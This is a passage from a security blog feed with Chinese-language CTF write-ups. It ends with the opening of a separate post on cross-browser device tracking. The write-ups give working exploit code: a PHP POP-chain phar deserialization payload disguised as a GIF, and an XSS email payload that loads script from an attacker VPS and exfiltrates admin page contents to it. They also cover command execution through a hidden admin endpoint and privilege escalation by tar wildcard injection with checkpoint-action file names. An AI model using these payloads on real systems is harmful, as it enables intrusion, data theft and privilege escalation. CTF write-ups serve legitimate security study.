plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.158.180:11115/file.php?file=file.php</span><br></pre></td></tr></table></figure></p><p>file.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>看到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file))</span><br></pre></td></tr></table></figure></p><p>本能的想到了phar，于是去读class.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.158.180:11115/file.php?file=class.php</span><br></pre></td></tr></table></figure></p><p>class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>分析一下这个pop链<br>首先是show()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>发现过滤了<code>f1ag</code>，那么利用点肯定不是它了，接着读到Test类，发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $text = base64_encode(file_get_contents($value));</span><br><span class="line">       <span class="keyword">return</span> $text;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>于是将目光锁定在Test类，那么开始想构造链<br>发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>不难知道，这个方法要在调用不存在属性的时候才会被触发<br>又看回Show类，发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">       <span class="keyword">return</span> $content;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>这里调用了source属性，只要将<code>str[&#39;str&#39;]</code>赋值为Test类即可<br>那么怎么触发<code>__toString</code>呢？<br>不难知道这个函数要在输出对象的时候才会被触发<br>看到C1e4r类<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>发现这里会进行对象输出，那么整个pop链就清晰了<br>1.利用C1e4r类的<code>__destruct()</code>中的<code>echo $this-&gt;test</code><br>2.触发Show类的<code>__toString()</code><br>3.利用Show类的<code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source</code><br>4.触发Test类的<code>__get()</code><br>5.成功利用<code>file_get()</code>读文件</p><h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p>思路清晰了，剩下的就是exp编写了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params = <span class="keyword">array</span>(<span class="string">"source"</span>=&gt;<span class="string">'/var/www/html/f1ag.php'</span>);</span><br><span class="line">$b = <span class="keyword">new</span> Show(<span class="string">'index.php'</span>);</span><br><span class="line">$b-&gt;str[<span class="string">'str'</span>] = $a;</span><br><span class="line">$c= <span class="keyword">new</span> C1e4r($b);</span><br><span class="line"><span class="keyword">echo</span> serialize($c);</span><br><span class="line">$obj = unserialize(<span class="string">'O:5:"C1e4r":2:&#123;s:4:"test";N;s:3:"str";O:4:"Show":2:&#123;s:6:"source";s:9:"index.php";s:3:"str";a:1:&#123;s:3:"str";O:4:"Test":2:&#123;s:4:"file";N;s:6:"params";a:1:&#123;s:6:"source";s:22:"/var/www/html/f1ag.php";&#125;&#125;&#125;&#125;&#125;'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exploit.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.php'</span>, <span class="string">'test'</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line">$phar-&gt;setMetadata($obj);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">rename(<span class="string">'skyfuck.phar'</span>, <span class="string">'skyfuck.gif'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="getflag-1"><a href="#getflag-1" class="headerlink" title="getflag"></a>getflag</h3><p>上传skyfuck.gif<br>然后根据<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>;</span><br></pre></td></tr></table></figure></p><p>计算出路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4b8e34dafe69a6a5ec8ba799e46e8e92.jpg</span><br></pre></td></tr></table></figure></p><p>触发反序列化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.158.180:11115/file.php?file=phar://upload/4b8e34dafe69a6a5ec8ba799e46e8e92.jpg</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-12-17-20-36-46.png" alt=""><br>解码<br><img src="/images/2018-12-17-20-36-56.png" alt=""><br>即可得到flag</p><h2 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h2><h3 id="信息搜集-4"><a href="#信息搜集-4" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>拿到题目发现2个功能<br>1.管理员页面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.56.208:6324/admin/admin.php</span><br></pre></td></tr></table></figure></p><p>2.邮箱申请<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.89.56.208:6324/check.php</span><br></pre></td></tr></table></figure></p><p>然后发现访问管理员页面：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">only localhost allowed!</span><br></pre></td></tr></table></figure></p><p>那么思路比较明显了，需要用邮箱申请XSS去本地访问管理员页面，同时抓取页面内容<br>在check.php页面源代码发现代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--check.php</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'email'</span>]) &#123;</span><br><span class="line">$email = $_POST[<span class="string">'email'</span>];</span><br><span class="line"><span class="keyword">if</span>(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"error email, please check your email"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"等待管理员自动审核"</span>;</span><br><span class="line"><span class="keyword">echo</span> $email;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>随机想bypass<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var($email,FILTER_VALIDATE_EMAIL)</span><br></pre></td></tr></table></figure></p><p>不难发现只要使用了引号包裹就可以进行xss<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&lt;script/src=//vps_ip/payload.js&gt;&lt;/script&gt;&quot;@example.com</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-12-18-18-09-29.png" alt=""><br>随机构造读源码脚本<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.location=<span class="string">'http://vps:23333/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">"admin.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-12-18-15-44-37.png" alt=""><br>解码后得到<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"admin/a0a.php?cmd=whoami"</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>发现存在rce</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>本能想到进行反弹shell，这样比较利于后续操作，于是改写脚本为<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.location=<span class="string">'http://vps:23333/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">'http://localhost:6324/admin/a0a.php?cmd=echo%20"xxxxxxxxxxxxx"%20|%20base64%20-d%20&gt;%20/tmp/sky.sh'</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure></p><p>向/tmp写入一个sky.sh<br>然后<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.location=<span class="string">'http://vps:23333/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">"GET"</span>,<span class="string">'http://localhost:6324/admin/a0a.php?cmd=/bin/bash%20/tmp/sky.sh'</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-12-18-18-35-59.png" alt=""><br>在根目录发现flag，但是不可读<br><img src="/images/2018-12-18-18-36-25.png" alt=""></p><h3 id="信息再次发掘"><a href="#信息再次发掘" class="headerlink" title="信息再次发掘"></a>信息再次发掘</h3><p>进一步寻找信息,在<code>/var/www/html</code>下发现<br><img src="/images/2018-12-18-18-38-00.png" alt=""><br>发现还有一个目录，于是进行查看<br><img src="/images/2018-12-18-18-38-33.png" alt=""><br>发现果然还有题目<br><img src="/images/2018-12-18-18-40-35.png" alt=""><br>然后查看代码<br>backup.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"upload.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"上传目录："</span> . $upload_dir . <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">$sys = <span class="string">"tar -czf z.tar.gz *"</span>;</span><br><span class="line">chdir($upload_dir);</span><br><span class="line">system($sys);</span><br><span class="line"><span class="keyword">if</span>(file_exists(<span class="string">'z.tar.gz'</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"上传目录下的所有文件备份成功!&lt;br /&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"备份文件名: z.tar.gz"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"未上传文件，无法备份！"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="提权与getflag"><a href="#提权与getflag" class="headerlink" title="提权与getflag"></a>提权与getflag</h3><p>后面想到的只能是提权了，看代码好像毫无什么明显问题<br>随后搜到这样一篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_27446553/article/details/80943097</span><br></pre></td></tr></table></figure></p><p>文章中，利用root的定时备份，成功反弹了root的shell，那么同理<br>这里我们的题目用flag用户进行备份，我们只要按照他的步骤，即可让flag用户帮我们执行sky.sh<br>于是利用上传，进行3个文件上传，文件名分别为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sky.sh</span><br><span class="line">--checkpoint-action=exec=sh sky.sh</span><br><span class="line">--checkpoint=1</span><br></pre></td></tr></table></figure></p><p>sky.sh的内容为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag | base64</span><br></pre></td></tr></table></figure></p><p>然后全部上传完毕，进行备份<br><img src="/images/2018-12-18-18-47-45.png" alt=""><br>即可得到flag:<code>swpuctf{xss_!_tar_exec_instr3st1ng}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Cross Browser Tracking Summary Part-1</title>
    <link href="http://skysec.top/2018/12/15/Cross-Browser-Tracking-Summary-Part-1/"/>
    <id>http://skysec.top/2018/12/15/Cross-Browser-Tracking-Summary-Part-1/</id>
    <published>2018-12-15T09:55:09.000Z</published>
    <updated>2019-01-27T13:45:02.745Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于先知 https://xz.aliyun.com/t/3721</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如何通过web浏览器确定设备指纹一直是一个难题，而本篇论文(Cross Browser Tracking_NDSS17)带给我们不少新的思考与突破点。<br>本人将结合个人理解，对该篇论文进行原理，代码等方面的详细分析。<br>本次解读分为4部分：<br>part1：文章整体结构梳理<br>part2：文章技术理论简单介绍与测试<br>part3：文章技术理论部分代码实现解读与测试<br>part4：文章整体架构部分代码实现解读与测试</p><h2 id="文章概要"><a href="#文章概要" class="headerlink" title="文章概要"></a>文章概要</h2><h3 id="文章目的"><a href="#文章目的" class="headerlink" title="文章目的"></a>文章目的</h3><p>通过操作系统与硬件等不同特征，无论用户使用多少种浏览器，都可以唯一跟踪用户设备。<br>比如：用户A无论使用了谷歌，火狐还是IE浏览器访问了我的网站，我都可以利用该论文中的技术计算出用户A的设备指纹，且无论使用哪种浏览器，设备指纹计算结果均相同</p><h3 id="文章由来"><a href="#文章由来" class="headerlink" title="文章由来"></a>文章由来</h3><p>第一代追踪技术：根据cookie进行跟踪<br>第二代追踪技术：根据js获取操作系统、分辨率、像素比等设备信息，进行设备跟踪，设备归并<br>（但此方法很难确保准确率，因为跨浏览器后会有很多参数发生改变）<br>第三代追踪技术：则是发现设备后面的人。通过人的习惯、人的行为等等来对人进行归并，此项技术比较复杂。</p><p>那么本文进行的研究是2.5代追踪技术，即第二代追踪技术的改进版，希望做到无论用户切换多少种浏览器，设备的跟踪都可以具有稳定性和唯一性</p><h2 id="文章结构"><a href="#文章结构" class="headerlink" title="文章结构"></a>文章结构</h2><h3 id="第一部分"><a href="#第一部分" class="headerlink" 